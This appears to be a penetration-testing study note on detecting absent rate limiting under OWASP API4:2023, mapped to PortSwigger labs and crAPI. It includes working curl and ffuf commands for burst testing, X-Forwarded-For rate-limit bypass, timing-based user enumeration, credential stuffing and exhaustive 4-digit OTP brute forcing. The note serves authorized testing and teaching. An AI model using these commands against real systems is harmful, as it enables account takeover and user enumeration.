# Detection Methodology — Unrestricted Resource Consumption

**OWASP API Security Top 10 2023 — API4:2023**

This file covers how to *detect* missing or weak rate limiting and resource controls
before attempting exploitation. Detection always comes before exploitation in a
professional test — you confirm the control is absent or weak, then move to file 03/04
for exploitation techniques.

---

## 1. Response-Based Detection

**Mechanism:** If an API enforces rate limiting, it will eventually respond differently
once a threshold is crossed. If it doesn't, every response looks identical no matter how
many requests you send. The goal is to send a burst of requests and diff the responses.

### 1.1 Baseline request

```
GET /api/v1/user/profile HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOi...
```

- **What it does:** Establishes a normal, expected response — status code, response
  time, body content, and headers — before any load is applied.
- **Why it matters:** You need a clean baseline to compare against. Without it you can't
  tell whether a later response is "different" or just normal variance.

### 1.2 Burst request loop (manual detection with `curl` + `for`)

```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
    -H "Authorization: Bearer eyJhbGciOi..." \
    https://api.target.com/api/v1/user/profile
done
```

Breakdown, flag by flag:

- `for i in $(seq 1 100); do ... done` — generates 100 sequential requests. 100 is a
  reasonable starting ceiling; most rate limits (if present) trigger well before this.
- `curl -s` — silent mode, suppresses curl's own progress output so only your `-w`
  format string prints.
- `-o /dev/null` — discards the response body; at this stage you only care about status
  code and timing, not content.
- `-w "%{http_code} %{time_total}\n"` — prints the HTTP status code and total request
  time for each request, one line per request. This is the data you analyze afterward.
- `-H "Authorization: Bearer ..."` — sends the request as an authenticated user, which
  matters because rate limiting is sometimes applied per-IP only and not per-token (or
  vice versa) — testing both surfaces gaps.

**What you're looking for in the output:**

- **Vulnerable pattern:** All 100 requests return `200` with roughly consistent timing.
  No `429 Too Many Requests`, no `403`, no degraded response time. This means there is
  no enforced ceiling — the resource (in this case, one DB read) has no limit.
- **Rate-limited pattern:** Status codes shift to `429` (or sometimes `403`) after N
  requests within the window, or response time increases sharply (server-side
  throttling/queueing) as the limit is approached.

### 1.3 Testing with Burp Intruder for higher-volume detection

- **What it does:** Burp Intruder's "Sniper" or "Null payloads" attack type can fire the
  same request repeatedly with configurable thread count and request rate, then Burp's
  results grid shows status code and response length per request, sortable and
  filterable.
- **Why it's used over `curl` loops for serious testing:** Burp gives you concurrent
  threads (not just sequential), a results table you can sort by status/length/time
  instantly, and it preserves the exact request including all headers, so you don't
  accidentally strip something like a session cookie that a script might mishandle.
- **Configuration used:** Payload type set to "Null payloads" (no actual payload
  variation needed, you just want repetition), number of requests set high (500–1000),
  and Resource Pool thread count increased (e.g., 20–50 concurrent threads) to simulate
  realistic burst traffic rather than one request every few hundred milliseconds.

### 1.4 What "response-based detection" is actually proving

You are proving **absence of a control**, which is harder to prove definitively than
presence of one. To make the finding credible in a report:

- Run the burst test at least twice, at different times, to rule out a transient network
  or infrastructure issue that coincidentally allowed the burst through.
- Test against more than one endpoint (a cheap one like `/profile` and an expensive one
  like `/search` or `/report`) — some APIs rate-limit expensive endpoints but forget
  cheap ones, or vice versa.
- Note the *absolute* request count reached with zero pushback (e.g., "1,000 requests in
  40 seconds returned 200 OK with no throttling") — this number is what makes the report
  concrete instead of a vague "rate limiting appears weak."

---

## 2. Header Analysis — `X-RateLimit-*` and Related Headers

**Mechanism:** Many APIs that *do* implement rate limiting communicate the current state
of the limit back to the client via response headers, following a de facto standard
(not a single RFC, but widely adopted from early GitHub/Twitter API conventions and
later formalized in IETF draft `RateLimit-*` headers).

### 2.1 Headers to check on every response

| Header | Meaning |
|---|---|
| `X-RateLimit-Limit` | The total number of requests allowed in the current window |
| `X-RateLimit-Remaining` | Requests remaining in the current window |
| `X-RateLimit-Reset` | Unix timestamp (or seconds) until the window resets |
| `Retry-After` | Seconds to wait before retrying (usually sent alongside a `429`) |
| `RateLimit-Limit` / `RateLimit-Remaining` / `RateLimit-Policy` | Newer IETF draft standard header names, increasingly seen in modern API gateways (Kong, AWS API Gateway, Cloudflare) |

### 2.2 How to pull and inspect headers quickly

```bash
curl -sI -H "Authorization: Bearer eyJhbGciOi..." \
  https://api.target.com/api/v1/user/profile | grep -i "ratelimit\|retry-after"
```

Breakdown:

- `curl -sI` — silent mode, `-I` sends a `HEAD` request (headers only, no body) for a
  fast header-only check. **Caveat:** some APIs don't apply the same rate-limit counting
  to `HEAD` vs `GET`, so this is a quick recon step, not a substitute for testing with
  the real method.
- `grep -i "ratelimit\|retry-after"` — case-insensitive filter for anything containing
  "ratelimit" or "retry-after", catching both the `X-RateLimit-*` and newer `RateLimit-*`
  header families in one pass.

### 2.3 What the presence/absence of these headers tells you

- **Headers present and decrementing correctly** — a rate limit exists. Move to testing
  whether it's *enforced consistently* (see 2.4 below) rather than assuming it's solid.
- **Headers present but `X-RateLimit-Remaining` never changes or never reaches 0
  even after exceeding `X-RateLimit-Limit` requests** — the header is cosmetic/stale;
  the underlying enforcement is broken or disconnected from the actual counting logic.
  This is a real, reportable finding distinct from "no rate limiting at all" — it's
  worse in a way, because it demonstrates the team believed they had a control that
  doesn't actually function.
- **Headers absent entirely** — either no rate limiting exists, or it exists but isn't
  communicated to the client (some gateways enforce limits silently and just return
  `429`/`403` with no explanatory headers). Absence of headers is *not* proof of absence
  of a limit — always follow up with the burst test in section 1.

### 2.4 Testing whether the limit is per-IP, per-token, or per-endpoint

**Why this matters:** A limit that's enforced per-IP alone is trivially bypassable by
an attacker with multiple IPs (residential proxies, cloud VMs) or by header spoofing
(section 2.5). A limit that's enforced per-token is more robust but can usually be
bypassed by anyone who can create multiple accounts.

- Send the burst test (section 1.2) using the **same token, rotating source IPs** (e.g.,
  via a proxy list or cloud instances). If the limit resets per new IP, it's IP-scoped.
- Send the burst test using the **same IP, rotating tokens** (multiple registered test
  accounts). If the limit resets per new token, it's token-scoped only, and IP-based
  attacks (e.g., unauthenticated enumeration, see section 3) may not be limited at all.

### 2.5 Header-spoofing bypass check (common misconfiguration)

Some rate limiters key off client-supplied headers like `X-Forwarded-For` when the
application is misconfigured to trust them from any source (not just a trusted reverse
proxy).

```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    https://api.target.com/api/v1/login
done
```

- **What it does:** Sends each request with a different fake `X-Forwarded-For` value
  (`10.0.0.1`, `10.0.0.2`, ... `10.0.0.50`).
- **Why it works when it works:** If the rate limiter naively trusts `X-Forwarded-For`
  as "the real client IP" without verifying it came from a trusted proxy hop, each
  request appears to originate from a different IP, and the per-IP counter never
  accumulates past 1. This is a well-known, industry-documented rate-limit bypass
  pattern (also applicable to `X-Real-IP`, `X-Client-IP`, and similar headers).
- **What confirms the bypass:** If the un-spoofed burst test triggered `429` at request
  N, but this spoofed version reaches 50/50 at `200`, the rate limiter is IP-based and
  trusts client-supplied headers — a legitimate, reportable finding.

---

## 3. Timing-Based Detection

**Mechanism:** Even when an API doesn't expose `X-RateLimit-*` headers or return `429`,
server-side throttling sometimes manifests as **increasing response latency** rather
than an explicit rejection — some implementations queue or artificially delay requests
instead of hard-rejecting them (a "leaky bucket" style implementation). Timing analysis
catches this softer form of control, and also catches a completely different class of
bug: **timing-based user enumeration** (section 4).

### 3.1 Detecting soft throttling via response time drift

```bash
for i in $(seq 1 50); do
  START=$(date +%s.%N)
  curl -s -o /dev/null https://api.target.com/api/v1/search?q=test
  END=$(date +%s.%N)
  echo "Request $i: $(echo "$END - $START" | bc)s"
done
```

- `date +%s.%N` — captures a high-precision (nanosecond) timestamp before and after each
  request.
- `echo "$END - $START" | bc` — computes elapsed time using `bc` since bash doesn't do
  floating-point arithmetic natively.
- **What you're looking for:** A flat, consistent response time across all 50 requests
  indicates no throttling. A steadily *increasing* response time (e.g., request 1 takes
  120ms, request 40 takes 2.5s) with no change in status code indicates the server is
  queueing/delaying requests as an informal throttle — worth noting in a report even
  though it's not a hard rejection, because it demonstrates the resource is still being
  consumed (server threads/connections held open) even while "throttling."

### 3.2 Timing-based user enumeration

**Mechanism:** Login, password reset, and registration endpoints frequently respond with
an identical *message* for "user doesn't exist" and "user exists, wrong password" (to
prevent the obvious enumeration flaw), but the **backend work differs**: checking a
password typically requires a bcrypt/argon2 hash comparison (deliberately slow, ~100–300ms),
while a nonexistent username short-circuits before that comparison ever runs (~10–20ms).
Absent rate limiting, an attacker can send enough requests to statistically confirm this
timing gap, turning a "safe" identical-error-message endpoint back into a full user
enumeration oracle.

```bash
# Known-valid username
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST https://api.target.com/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong_password_here"}'
done

# Suspected-invalid username
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST https://api.target.com/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"doesnotexist_zzz","password":"wrong_password_here"}'
done
```

- Running each case 20 times (not once) and averaging is important — network jitter on
  a single request makes a one-shot timing comparison unreliable. Averaging across many
  requests smooths out noise and makes a genuine ~100ms+ gap statistically obvious.
- **Why absent rate limiting is the enabling condition:** Without rate limiting, you can
  run this timing comparison against thousands of candidate usernames in a scripted loop
  with no friction, turning a subtle timing side-channel into a practical, automatable
  enumeration tool.

---

## 4. Enumeration and Brute-Force Enabled by Absent Rate Limiting

This section is intentionally scoped to **the resource-consumption angle** of these
attacks. Full authentication mechanism details (password policies, session handling,
JWT specifics) live in the Broken Authentication (API2:2023) series — cross-reference
that series for the authentication-mechanism-level analysis. Here, the focus is: *why
does absent rate limiting turn an otherwise-minor authentication weakness into a
practical mass-exploitation path.*

### 4.1 User enumeration via response differences

```
POST /api/v1/register HTTP/1.1
Content-Type: application/json

{"email":"victim@target.com","password":"Test1234!"}
```

- **What it does:** Attempts to register an account with an email address the attacker
  wants to check for existing registration.
- **Why the response matters:** Many registration endpoints return a distinct message
  like `"Email already registered"` vs `"Account created"` — a direct enumeration oracle
  requiring zero timing analysis.
- **Why absent rate limiting is the multiplier:** A single enumeration check is a minor
  information leak. Absent rate limiting, an attacker feeds a list of thousands of email
  addresses (e.g., a leaked breach corpus) through this endpoint in an automated loop and
  builds a confirmed list of every registered user on the platform, which is direct
  input to a credential-stuffing campaign (4.2) or targeted phishing.

### 4.2 Credential stuffing

```bash
# Using a tool like ffuf against a login endpoint, one line per candidate credential pair
ffuf -request login_request.txt -request-proto https \
  -w credential_pairs.txt:PAIR \
  -mc all -fc 401 -t 50
```

Breakdown:

- `-request login_request.txt` — loads a raw HTTP request template (captured from Burp)
  containing a placeholder, so ffuf reuses exact headers/cookies from a real request.
- `-w credential_pairs.txt:PAIR` — wordlist of `username:password` pairs (from a known
  breach corpus in a lab/authorized test context), mapped to the `PAIR` placeholder in
  the request template.
- `-mc all -fc 401` — match all status codes, but filter out (`-fc`) `401 Unauthorized`
  responses, so only the interesting non-401 results (successful logins, or different
  failure codes worth investigating) remain visible.
- `-t 50` — 50 concurrent threads. This concurrency is only practically useful against
  a target with weak/absent rate limiting; against a properly rate-limited login
  endpoint, this same command gets throttled to a crawl or blocked outright, which is
  itself the detection signal.
- **Why this belongs in an Unrestricted Resource Consumption note series and not only
  the Broken Authentication series:** Credential stuffing is a *resource consumption
  attack against the authentication resource* — the vulnerability being exploited here
  is literally "the login endpoint has no cap on attempts," which is a rate-limiting
  failure. The stolen credentials themselves are a Broken Authentication (API2) concern;
  the ability to test millions of them automatically is an API4 concern.

### 4.3 OTP / password-reset-code brute force

```bash
for code in $(seq -w 0000 9999); do
  RESULT=$(curl -s -X POST https://api.target.com/api/v1/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"user_id\":\"12345\",\"otp\":\"$code\"}")
  echo "$RESULT" | grep -q "success" && echo "FOUND: $code" && break
done
```

- `seq -w 0000 9999` — generates every possible 4-digit OTP, zero-padded (`-w`) so
  `7` becomes `0007` instead of `7`, matching the expected format.
- **Why this is trivially feasible only when rate limiting is absent:** A 4-digit OTP
  has only 10,000 possible values. At even a modest 20 requests/second (easily
  achievable with no throttling), the entire keyspace is exhausted in under 10 minutes.
  A correctly rate-limited OTP endpoint (e.g., 5 attempts per code lifetime, then
  lockout) makes this attack computationally infeasible regardless of keyspace size —
  which is exactly why rate limiting, not OTP length alone, is the real control here.

---

## 5. PortSwigger Web Security Academy Lab Mapping (Progression Order)

PortSwigger does not have a dedicated "rate limiting" category, so relevant labs are
drawn from **Authentication** and **Business Logic Vulnerabilities**, in the order
PortSwigger presents increasing difficulty:

| Order | Lab | What it teaches for this series |
|---|---|---|
| 1 | *Authentication* → "Username enumeration via different responses" | Response-based enumeration detection (section 4.1) |
| 2 | *Authentication* → "Username enumeration via subtly different responses" | Refines detection to subtle response diffing, not just obvious message differences |
| 3 | *Authentication* → "Username enumeration via response timing" | Directly maps to section 3.2 timing-based enumeration |
| 4 | *Authentication* → "Broken brute-force protection, IP block" | Maps to section 2.5 — bypassing IP-scoped rate limiting |
| 5 | *Authentication* → "2FA broken logic" | Adjacent OTP/brute-force logic flaw, complements section 4.3 |
| 6 | *Business logic vulnerabilities* → "Insufficient workflow validation" and related labs on unrestricted actions | General pattern of missing server-side limits on repeated actions |

**Honest gap disclosure:** PortSwigger Web Security Academy, as of this writing, has
**no lab that directly demonstrates classic API rate-limit-header analysis
(`X-RateLimit-*`), pagination-based resource exhaustion, regex complexity/ReDoS attacks,
or third-party spending abuse** — these are API-specific and cost-based attack classes
that PortSwigger's lab catalog does not cover in a dedicated, hands-on way. This is a
genuine gap in PortSwigger's coverage for API4:2023 as a whole. For those techniques,
this series relies on **crAPI** (see section 6) and manually constructed test scenarios
against intentionally vulnerable API labs, rather than PortSwigger.

---

## 6. crAPI Reference for Rate-Limiting-Specific Practice

**crAPI (Completely Ridiculous API)** is OWASP's dedicated vulnerable API training
target and is the primary hands-on reference for this entire series, since PortSwigger's
gap (section 5) leaves API-specific resource consumption largely uncovered there.

Relevant crAPI components for this file's detection techniques:

- **crAPI's OTP/coupon validation endpoints** — directly practice section 4.3 (OTP
  brute-force) and general rate-limit-absence detection (section 1) in a legal,
  intentionally vulnerable environment.
- **crAPI's login and forgot-password flows** — practice sections 4.1/4.2 (enumeration,
  credential stuffing) against a target explicitly built to be missing these controls.

Cross-reference the API Fundamentals / API Security Top 10 overview notes for full crAPI
setup instructions (Docker Compose deployment) if not already covered there.

---

## 7. What to Carry Forward

Once absence or weakness of rate limiting is confirmed using the methods in this file,
proceed to:

- **File 03** for exploiting the absence via pagination abuse, file upload abuse, regex
  complexity, and expensive computation endpoints.
- **File 04** for exploiting the absence specifically against third-party paid services
  reachable through the API.
